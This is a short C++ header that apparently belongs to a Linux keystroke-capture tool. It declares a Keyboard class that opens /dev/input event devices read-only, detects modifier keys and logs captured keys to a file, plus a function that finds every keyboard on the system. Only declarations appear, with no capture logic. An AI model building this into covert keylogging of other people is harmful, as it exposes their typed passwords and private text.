#include <dirent.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/version.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <fstream>
#include <future>
#include <iomanip>
#include <iostream>
#include <regex>
#include <string>
#include <vector>

#include "parsing.hpp"


static int _isEventDevice(const struct dirent* directory);

class Keyboard {
   public:
    std::string devicePath, captureLog;
    int deviceFile;

    Keyboard(std::string& devPath, std::string& capLog):
    devicePath(devPath), captureLog(capLog), deviceFile(-1){}

    ~Keyboard() { close(deviceFile); }

    void openDeviceFile() { deviceFile = open(devicePath.c_str(), O_RDONLY); }

    bool isModifierKey(const char* key);

    void capture();
};

std::vector<Keyboard> findKeyboards(const std::string& path_to_log);